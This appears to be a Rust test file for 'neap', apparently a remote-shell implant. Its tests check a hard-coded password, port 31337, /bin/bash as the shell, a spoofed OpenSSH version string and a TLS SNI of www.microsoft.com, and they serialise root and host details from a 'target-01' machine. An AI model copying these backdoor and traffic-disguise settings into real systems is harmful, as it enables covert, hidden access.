#[tokio::test]
async fn test_config_defaults() {
    assert_eq!(neap::config::PASSWORD, "letmeinbrudipls");
    assert_eq!(neap::config::LUSER, "svc");
    assert_eq!(neap::config::LPORT, "31337");
    assert_eq!(neap::config::BPORT, "0");
    assert_eq!(neap::config::DEFAULT_SHELL, "/bin/bash");
    assert_eq!(neap::config::SSH_VERSION, "OpenSSH_8.9");
    assert_eq!(neap::config::TLS_SNI, "www.microsoft.com");
}

#[tokio::test]
async fn test_extra_info_serialization() {
    use neap::info::ExtraInfo;

    let info = ExtraInfo {
        current_user: "root".to_string(),
        hostname: "target-01".to_string(),
        listening_address: "127.0.0.1:31337".to_string(),
    };

    let bytes = info.to_ssh_bytes();
    let decoded = ExtraInfo::from_ssh_bytes(&bytes).unwrap();

    assert_eq!(decoded.current_user, "root");
    assert_eq!(decoded.hostname, "target-01");
    assert_eq!(decoded.listening_address, "127.0.0.1:31337");
}

#[tokio::test]
async fn test_free_port_binding() {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    assert!(port > 0);
}
